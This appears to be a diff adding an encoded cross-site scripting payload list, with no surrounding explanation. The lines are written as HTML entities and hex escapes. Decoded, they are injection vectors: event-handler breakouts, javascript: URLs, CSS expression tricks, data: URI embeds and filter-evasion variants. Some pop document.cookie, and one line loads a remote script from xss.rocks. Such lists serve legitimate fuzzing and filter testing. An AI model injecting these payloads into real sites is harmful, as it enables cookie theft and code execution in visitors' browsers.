+&#60;&#109;&#101;&#116;&#97;&#32;&#104;&#116;&#116;&#112;&#45;&#101;&#113;&#117;&#105;&#118;&#61;&#114;&#101;&#102;&#114;&#101;&#115;&#104;&#32;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#61;&#34;&#48;&#59;&#117;&#114;&#108;&#61;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#34;&#62;
+&#60;&#109;&#101;&#116;&#97;&#32;&#104;&#116;&#116;&#112;&#45;&#101;&#113;&#117;&#105;&#118;&#61;&#114;&#101;&#102;&#114;&#101;&#115;&#104;&#32;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#61;&#34;&#48;&#59;&#117;&#114;&#108;&#61;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#34;&#62;
+&#60;&#115;&#116;&#121;&#108;&#101;&#62;&#64;&#105;&#109;&#112;&#111;&#114;&#116;&#39;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#39;&#59;&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;
+&#60;&#115;&#116;&#121;&#108;&#101;&#62;&#64;&#105;&#109;&#112;&#111;&#114;&#116;&#39;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#39;&#59;&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;
+&#60;&#115;&#116;&#121;&#108;&#101;&#62;&#64;&#105;&#109;&#112;&#111;&#114;&#116;&#39;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#39;&#59;&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;
+&#60;&#100;&#105;&#118;&#32;&#115;&#116;&#121;&#108;&#101;&#61;&#34;&#119;&#105;&#100;&#116;&#104;&#58;&#101;&#120;&#112;&#114;&#101;&#115;&#115;&#105;&#111;&#110;&#40;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#41;&#34;&#62;&#120;&#60;&#47;&#100;&#105;&#118;&#62;
+&#60;&#100;&#105;&#118;&#32;&#115;&#116;&#121;&#108;&#101;&#61;&#34;&#119;&#105;&#100;&#116;&#104;&#58;&#101;&#120;&#112;&#114;&#101;&#115;&#115;&#105;&#111;&#110;&#40;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#41;&#34;&#62;&#120;&#60;&#47;&#100;&#105;&#118;&#62;
+&#60;&#100;&#105;&#118;&#32;&#115;&#116;&#121;&#108;&#101;&#61;&#34;&#119;&#105;&#100;&#116;&#104;&#58;&#101;&#120;&#112;&#114;&#101;&#115;&#115;&#105;&#111;&#110;&#40;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#41;&#34;&#62;&#120;&#60;&#47;&#100;&#105;&#118;&#62;
+&#34;&#32;&#111;&#110;&#109;&#111;&#117;&#115;&#101;&#111;&#118;&#101;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#32;&#120;&#61;&#34;
+&#34;&#32;&#111;&#110;&#109;&#111;&#117;&#115;&#101;&#111;&#118;&#101;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#32;&#120;&#61;&#34;
+&#34;&#32;&#111;&#110;&#109;&#111;&#117;&#115;&#101;&#111;&#118;&#101;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#32;&#120;&#61;&#34;
+&#39;&#32;&#111;&#110;&#109;&#111;&#117;&#115;&#101;&#111;&#118;&#101;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#32;&#120;&#61;&#39;
+&#39;&#32;&#111;&#110;&#109;&#111;&#117;&#115;&#101;&#111;&#118;&#101;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#32;&#120;&#61;&#39;
+&#39;&#32;&#111;&#110;&#109;&#111;&#117;&#115;&#101;&#111;&#118;&#101;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#32;&#120;&#61;&#39;
+&#34;&#32;&#97;&#117;&#116;&#111;&#102;&#111;&#99;&#117;&#115;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#32;&#120;&#61;&#34;
+&#34;&#32;&#97;&#117;&#116;&#111;&#102;&#111;&#99;&#117;&#115;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#32;&#120;&#61;&#34;
+&#34;&#32;&#97;&#117;&#116;&#111;&#102;&#111;&#99;&#117;&#115;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#32;&#120;&#61;&#34;
+&#34;&#32;&#111;&#110;&#99;&#108;&#105;&#99;&#107;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#32;&#120;&#61;&#34;
+&#34;&#32;&#111;&#110;&#99;&#108;&#105;&#99;&#107;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#32;&#120;&#61;&#34;
+&#34;&#32;&#111;&#110;&#99;&#108;&#105;&#99;&#107;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#32;&#120;&#61;&#34;
+&#60;&#115;&#118;&#103;&#62;&#60;&#112;&#62;&#60;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#47;&#112;&#62;&#60;&#47;&#115;&#118;&#103;&#62;
+&#60;&#115;&#118;&#103;&#62;&#60;&#112;&#62;&#60;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#47;&#112;&#62;&#60;&#47;&#115;&#118;&#103;&#62;
+&#60;&#115;&#118;&#103;&#62;&#60;&#112;&#62;&#60;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#115;&#116;&#121;&#108;&#101;&#62;&#60;&#47;&#112;&#62;&#60;&#47;&#115;&#118;&#103;&#62;
+&#60;&#110;&#111;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#112;&#32;&#116;&#105;&#116;&#108;&#101;&#61;&#34;&#60;&#47;&#110;&#111;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#34;&#62;
+&#60;&#110;&#111;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#112;&#32;&#116;&#105;&#116;&#108;&#101;&#61;&#34;&#60;&#47;&#110;&#111;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#34;&#62;
+&#60;&#110;&#111;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#112;&#32;&#116;&#105;&#116;&#108;&#101;&#61;&#34;&#60;&#47;&#110;&#111;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#34;&#62;
+&#60;&#116;&#101;&#109;&#112;&#108;&#97;&#116;&#101;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#116;&#101;&#109;&#112;&#108;&#97;&#116;&#101;&#62;
+&#60;&#116;&#101;&#109;&#112;&#108;&#97;&#116;&#101;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#60;&#47;&#116;&#101;&#109;&#112;&#108;&#97;&#116;&#101;&#62;
+&#60;&#116;&#101;&#109;&#112;&#108;&#97;&#116;&#101;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#116;&#101;&#109;&#112;&#108;&#97;&#116;&#101;&#62;
+&#60;&#110;&#111;&#101;&#109;&#98;&#101;&#100;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#110;&#111;&#101;&#109;&#98;&#101;&#100;&#62;
+&#60;&#110;&#111;&#101;&#109;&#98;&#101;&#100;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#60;&#47;&#110;&#111;&#101;&#109;&#98;&#101;&#100;&#62;
+&#60;&#110;&#111;&#101;&#109;&#98;&#101;&#100;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#110;&#111;&#101;&#109;&#98;&#101;&#100;&#62;
+&#60;&#110;&#111;&#102;&#114;&#97;&#109;&#101;&#115;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#110;&#111;&#102;&#114;&#97;&#109;&#101;&#115;&#62;
+&#60;&#110;&#111;&#102;&#114;&#97;&#109;&#101;&#115;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#60;&#47;&#110;&#111;&#102;&#114;&#97;&#109;&#101;&#115;&#62;
+&#60;&#110;&#111;&#102;&#114;&#97;&#109;&#101;&#115;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#110;&#111;&#102;&#114;&#97;&#109;&#101;&#115;&#62;
+&#60;&#120;&#115;&#115;&#32;&#105;&#100;&#61;&#120;&#32;&#116;&#97;&#98;&#105;&#110;&#100;&#101;&#120;&#61;&#49;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#120;&#115;&#115;&#62;
+&#60;&#120;&#115;&#115;&#32;&#105;&#100;&#61;&#120;&#32;&#116;&#97;&#98;&#105;&#110;&#100;&#101;&#120;&#61;&#49;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#60;&#47;&#120;&#115;&#115;&#62;
+&#60;&#120;&#115;&#115;&#32;&#105;&#100;&#61;&#120;&#32;&#116;&#97;&#98;&#105;&#110;&#100;&#101;&#120;&#61;&#49;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#120;&#115;&#115;&#62;
+&#60;&#118;&#105;&#100;&#101;&#111;&#62;&#60;&#115;&#111;&#117;&#114;&#99;&#101;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#118;&#105;&#100;&#101;&#111;&#62;
+&#60;&#118;&#105;&#100;&#101;&#111;&#62;&#60;&#115;&#111;&#117;&#114;&#99;&#101;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#62;&#60;&#47;&#118;&#105;&#100;&#101;&#111;&#62;
+&#60;&#118;&#105;&#100;&#101;&#111;&#62;&#60;&#115;&#111;&#117;&#114;&#99;&#101;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#62;&#60;&#47;&#118;&#105;&#100;&#101;&#111;&#62;
+&#60;&#111;&#98;&#106;&#101;&#99;&#116;&#32;&#100;&#97;&#116;&#97;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#44;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;&#60;&#47;&#111;&#98;&#106;&#101;&#99;&#116;&#62;
+&#60;&#111;&#98;&#106;&#101;&#99;&#116;&#32;&#100;&#97;&#116;&#97;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#44;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;&#60;&#47;&#111;&#98;&#106;&#101;&#99;&#116;&#62;
+&#60;&#111;&#98;&#106;&#101;&#99;&#116;&#32;&#100;&#97;&#116;&#97;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#44;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;&#60;&#47;&#111;&#98;&#106;&#101;&#99;&#116;&#62;
+&#60;&#101;&#109;&#98;&#101;&#100;&#32;&#115;&#114;&#99;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#44;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;
+&#60;&#101;&#109;&#98;&#101;&#100;&#32;&#115;&#114;&#99;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#44;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;
+&#60;&#101;&#109;&#98;&#101;&#100;&#32;&#115;&#114;&#99;&#61;&#34;&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#44;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#34;&#62;
+&#60;&#115;&#99;&#114;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#92;&#117;&#48;&#48;&#54;&#53;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#99;&#111;&#110;&#92;&#117;&#48;&#48;&#54;&#54;&#105;&#114;&#109;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#112;&#114;&#111;&#92;&#117;&#48;&#48;&#54;&#68;&#112;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#119;&#105;&#110;&#100;&#111;&#119;&#91;&#39;&#97;&#108;&#39;&#37;&#50;&#66;&#39;&#101;&#114;&#116;&#39;&#93;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#119;&#105;&#110;&#100;&#111;&#119;&#91;&#39;&#99;&#111;&#110;&#39;&#37;&#50;&#66;&#39;&#102;&#105;&#114;&#109;&#39;&#93;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#119;&#105;&#110;&#100;&#111;&#119;&#91;&#39;&#112;&#114;&#111;&#39;&#37;&#50;&#66;&#39;&#109;&#112;&#116;&#39;&#93;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#103;&#108;&#111;&#98;&#97;&#108;&#84;&#104;&#105;&#115;&#91;&#39;&#97;&#108;&#101;&#114;&#116;&#39;&#93;&#40;&#49;&#41;&#62;
+&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#103;&#108;&#111;&#98;&#97;&#108;&#84;&#104;&#105;&#115;&#91;&#39;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#39;&#93;&#40;&#49;&#41;&#62;
+&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#103;&#108;&#111;&#98;&#97;&#108;&#84;&#104;&#105;&#115;&#91;&#39;&#112;&#114;&#111;&#109;&#112;&#116;&#39;&#93;&#40;&#49;&#41;&#62;
+&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#115;&#116;&#121;&#108;&#101;&#61;&#120;&#58;&#101;&#120;&#112;&#114;&#101;&#115;&#115;&#105;&#111;&#110;&#40;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#41;&#62;
+&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#115;&#116;&#121;&#108;&#101;&#61;&#120;&#58;&#101;&#120;&#112;&#114;&#101;&#115;&#115;&#105;&#111;&#110;&#40;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;&#41;&#62;
+&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#115;&#116;&#121;&#108;&#101;&#61;&#120;&#58;&#101;&#120;&#112;&#114;&#101;&#115;&#115;&#105;&#111;&#110;&#40;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;&#41;&#62;
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x77\x69\x6e\x64\x6f\x77\x2e\x6f\x72\x69\x67\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x77\x69\x6e\x64\x6f\x77\x2e\x6f\x72\x69\x67\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x77\x69\x6e\x64\x6f\x77\x2e\x6f\x72\x69\x67\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x2f\x2f\x78\x73\x73\x2e\x72\x6f\x63\x6b\x73\x2f\x78\x73\x73\x2e\x6a\x73\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x22\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x22\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x22\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x27\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x27\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x27\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x22\x3e\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x22\x3e\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x22\x3e\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x27\x3e\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x27\x3e\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x27\x3e\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x22\x3e\x3c\x76\x69\x64\x65\x6f\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x22\x3e\x3c\x76\x69\x64\x65\x6f\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x22\x3e\x3c\x76\x69\x64\x65\x6f\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x22\x3e\x3c\x61\x75\x64\x69\x6f\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x22\x3e\x3c\x61\x75\x64\x69\x6f\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x22\x3e\x3c\x61\x75\x64\x69\x6f\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x22\x3e\x3c\x64\x65\x74\x61\x69\x6c\x73\x20\x6f\x70\x65\x6e\x20\x6f\x6e\x74\x6f\x67\x67\x6c\x65\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x22\x3e\x3c\x64\x65\x74\x61\x69\x6c\x73\x20\x6f\x70\x65\x6e\x20\x6f\x6e\x74\x6f\x67\x67\x6c\x65\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x22\x3e\x3c\x64\x65\x74\x61\x69\x6c\x73\x20\x6f\x70\x65\x6e\x20\x6f\x6e\x74\x6f\x67\x67\x6c\x65\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
